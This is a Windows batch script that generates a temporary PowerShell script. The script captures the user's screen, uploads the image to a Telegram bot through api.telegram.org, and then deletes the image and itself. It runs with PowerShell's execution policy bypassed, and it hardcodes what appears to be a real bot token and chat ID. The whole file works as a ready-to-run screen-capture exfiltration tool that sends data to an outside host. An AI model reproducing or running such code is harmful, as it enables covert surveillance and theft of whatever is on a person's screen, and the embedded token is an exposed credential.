@echo off
setlocal

:: Put your Telegram Bot token and User ID here
set "BOT_TOKEN=7749125191:AAG9ALJEsYYA7jDxg3dZzC5GiQNOU94p064"
set "USER_ID=2001564322"

:: Path for temp PowerShell script
set "PS_SCRIPT=%temp%\SendOneScreenshot.ps1"

:: Create PowerShell script line by line
(
echo Add-Type -AssemblyName System.Windows.Forms
echo Add-Type -AssemblyName System.Drawing
echo $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
echo $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
echo $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
echo $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
echo $file = Join-Path $env:TEMP "single_screenshot.png"
echo $bitmap.Save($file, [System.Drawing.Imaging.ImageFormat]::Png)
echo $bitmap.Dispose()
echo $graphics.Dispose()
echo $botToken = "%BOT_TOKEN%"
echo $userId = "%USER_ID%"
echo $uri = "https://api.telegram.org/bot$botToken/sendPhoto"
echo $fileContent = Get-Item $file
echo Invoke-RestMethod -Uri $uri -Method Post -Form @{ chat_id = $userId; photo = $fileContent }
echo Remove-Item $file
) > "%PS_SCRIPT%"

:: Run PowerShell script with execution bypass
powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_SCRIPT%"

:: Clean up PowerShell script after running
del "%PS_SCRIPT%"

pause
